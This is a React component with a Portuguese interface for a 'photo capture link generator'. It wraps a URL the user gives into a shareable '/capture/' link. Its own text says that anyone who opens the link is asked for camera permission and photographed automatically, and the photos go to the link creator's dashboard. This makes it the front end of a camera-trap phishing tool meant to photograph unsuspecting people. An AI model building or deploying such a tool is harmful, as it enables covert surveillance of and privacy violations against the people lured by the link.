import React, { useState } from 'react';
import { Link2, Camera, Copy, CheckCircle, ExternalLink } from 'lucide-react';
import { createSession, debugStorage } from '../utils/storage';

export const LinkGenerator: React.FC = () => {
  const [originalUrl, setOriginalUrl] = useState('');
  const [generatedLink, setGeneratedLink] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [copied, setCopied] = useState(false);

  const handleGenerate = async () => {
    if (!originalUrl.trim()) return;
    
    setIsLoading(true);
    
    try {
      // Add protocol if missing
      let url = originalUrl.trim();
      if (!url.startsWith('http://') && !url.startsWith('https://')) {
        url = 'https://' + url;
      }
      
      console.log('Creating session for URL:', url);
      
      // Simulate processing time
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      const session = createSession(url);
      const captureUrl = `${window.location.origin}/capture/${session.id}`;
      
      console.log('Generated capture URL:', captureUrl);
      setGeneratedLink(captureUrl);
      
      // Debug storage after creation
      debugStorage();
      
    } catch (error) {
      console.error('Error generating link:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleCopy = async () => {
    if (!generatedLink) return;
    
    try {
      await navigator.clipboard.writeText(generatedLink);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy:', err);
      // Fallback for older browsers
      const textArea = document.createElement('textarea');
      textArea.value = generatedLink;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const testLink = () => {
    if (generatedLink) {
      window.open(generatedLink, '_blank');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-indigo-900 via-purple-900 to-pink-900 flex items-center justify-center p-4">
      <div className="max-w-2xl w-full">
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-white/10 rounded-full mb-4">
            <Camera className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-4xl font-bold text-white mb-4">
            Gerador de Captura de Foto
          </h1>
          <p className="text-xl text-white/80">
            Crie um link especial que captura fotos automaticamente quando acessado
          </p>
        </div>

        <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 border border-white/20">
          <div className="space-y-6">
            <div>
              <label htmlFor="url" className="block text-sm font-medium text-white mb-3">
                Digite sua URL original
              </label>
              <div className="relative">
                <Link2 className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-white/60" />
                <input
                  id="url"
                  type="url"
                  value={originalUrl}
                  onChange={(e) => setOriginalUrl(e.target.value)}
                  placeholder="https://exemplo.com ou exemplo.com"
                  className="w-full pl-12 pr-4 py-4 bg-white/10 border border-white/20 rounded-xl text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent transition-all"
                />
              </div>
            </div>

            <button
              onClick={handleGenerate}
              disabled={!originalUrl.trim() || isLoading}
              className="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white font-semibold py-4 px-6 rounded-xl hover:from-blue-600 hover:to-purple-700 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2 focus:ring-offset-transparent disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98]"
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mr-3"></div>
                  Gerando...
                </div>
              ) : (
                'Gerar Link de Captura'
              )}
            </button>

            {generatedLink && (
              <div className="bg-white/5 rounded-xl p-6 border border-white/10">
                <h3 className="text-lg font-semibold text-white mb-3">Seu Link de Captura</h3>
                <div className="flex items-center gap-3 mb-4">
                  <div className="flex-1 bg-white/10 rounded-lg p-3 border border-white/20">
                    <p className="text-white/90 text-sm break-all">{generatedLink}</p>
                  </div>
                  <button
                    onClick={handleCopy}
                    className="flex items-center gap-2 bg-green-500 hover:bg-green-600 text-white px-4 py-3 rounded-lg transition-colors"
                  >
                    {copied ? (
                      <>
                        <CheckCircle className="w-4 h-4" />
                        Copiado!
                      </>
                    ) : (
                      <>
                        <Copy className="w-4 h-4" />
                        Copiar
                      </>
                    )}
                  </button>
                </div>
                
                <div className="flex gap-3">
                  <button
                    onClick={testLink}
                    className="flex items-center gap-2 bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-lg transition-colors text-sm"
                  >
                    <ExternalLink className="w-4 h-4" />
                    Testar Link
                  </button>
                  <button
                    onClick={() => window.location.href = '/dashboard'}
                    className="flex items-center gap-2 bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded-lg transition-colors text-sm"
                  >
                    <Camera className="w-4 h-4" />
                    Ver Dashboard
                  </button>
                </div>
                
                <p className="text-white/60 text-sm mt-4">
                  Compartilhe este link com outras pessoas. Quando elas acessarem, será solicitada permissão da câmera e uma foto será capturada automaticamente.
                </p>
              </div>
            )}
          </div>
        </div>

        <div className="text-center mt-8">
          <p className="text-white/60 text-sm">
            Todos os dados são armazenados localmente no seu navegador. As fotos são capturadas automaticamente quando o link é acessado.
          </p>
        </div>
      </div>
    </div>
  );
};